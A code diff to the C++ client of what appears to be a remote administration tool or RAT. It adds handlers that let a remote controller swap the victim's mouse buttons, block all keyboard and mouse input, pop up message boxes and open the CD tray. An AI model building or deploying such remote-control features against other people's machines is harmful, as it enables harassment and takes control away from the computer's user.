@@ -80,6 +80,10 @@ void Cliente::DestroyClasses() {
         DeleteObj<mod_Escaner>(this->mod_Scan);
     }
 
+    if (this->mod_Fun != nullptr) {
+        DeleteObj<modFun>(this->mod_Fun);
+    }
+
     __DBG_("[DC] Clases destruidas");
 }
 
@@ -940,6 +944,52 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
         return;
     }
     
+    //Mod fun - swap mouse
+    if (iComando == EnumComandos::Fun_Swap_Mouse) {
+        if (this->mod_Fun == nullptr) {
+            this->mod_Fun = new modFun();
+        }
+        BOOL _swap = atoi(paquete.cBuffer.data());
+        this->mod_Fun->m_SwapMouse(_swap);
+        return;
+    }
+
+    //Mod fun - block input
+    if (iComando == EnumComandos::Fun_Block_Input) {
+        if (this->mod_Fun == nullptr) {
+            this->mod_Fun = new modFun();
+        }
+        BOOL _block = atoi(paquete.cBuffer.data());
+        this->mod_Fun->m_BlockInput(_block);
+        return;
+    }
+
+    //Mod fun - msg
+    if (iComando == EnumComandos::Fun_Msg) {
+        if (this->mod_Fun == nullptr) {
+            this->mod_Fun = new modFun();
+        }
+        std::vector<std::string> vcData = strSplit(std::string(paquete.cBuffer.data()), "<ravdo>", 3);
+        if (vcData.size() == 3) {
+            const char* msg = vcData[0].c_str();
+            const char* title = vcData[1].c_str();
+            UINT type = static_cast<UINT>(atoi(vcData[2].c_str()));
+
+            this->mod_Fun->m_Msg(msg, title, type);
+        }
+        
+        return;
+    }
+
+    //Mod fun - cd
+    if (iComando == EnumComandos::Fun_CD) {
+        if (this->mod_Fun == nullptr) {
+            this->mod_Fun = new modFun();
+        }
+        BOOL _open = atoi(paquete.cBuffer.data());
+        this->mod_Fun->m_CD(_open);
+        return;
+    }
 }
 
 void Cliente::Procesar_Paquete(const Paquete& paquete) {
